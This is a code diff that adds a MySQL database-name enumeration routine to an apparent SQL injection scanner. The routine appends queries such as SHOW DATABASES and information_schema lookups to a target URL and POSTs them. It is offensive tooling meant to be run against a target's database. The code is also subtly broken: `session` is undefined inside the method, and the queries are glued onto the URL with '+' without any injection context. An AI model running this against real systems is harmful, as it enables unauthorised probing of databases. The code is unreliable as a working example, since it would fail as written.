@@ -58,6 +58,27 @@ class SQLInjectionScanner:
         else:
             print(f"Unsupported database type: {self.database_type}")
 
+    async def perform_mysql_get_database_name(self):
+        print("MySQL: Retrieving Database name...")
+        for query in [
+            "SELECT DATABASE(); --",  # Basic Query for Database Name
+            "SELECT SCHEMA_NAME FROM information_schema.schemata; --",  # Query for Schema Names
+            "SELECT DISTINCT(db) FROM mysql.db; --",  # Query for distinct databases
+            "SELECT GROUP_CONCAT(DISTINCT db) FROM mysql.db; --",  # Query using GROUP_CONCAT
+            "SHOW DATABASES; --",  # Query using SHOW DATABASES
+            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.tables; --",  # Query using INFORMATION_SCHEMA.TABLES
+            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.views; --",  # Query using INFORMATION_SCHEMA.VIEWS
+            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.columns; --",  # Query using INFORMATION_SCHEMA.COLUMNS
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
 
 # Get Current User
     async def get_current_user(self):
@@ -261,7 +282,7 @@ class SQLInjectionScanner:
             await scanner.get_current_user()
         else:
             print(f"Could not find a vulnerability...")
-            
+
 async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
     parser.add_argument("target_url", help="Target URL")
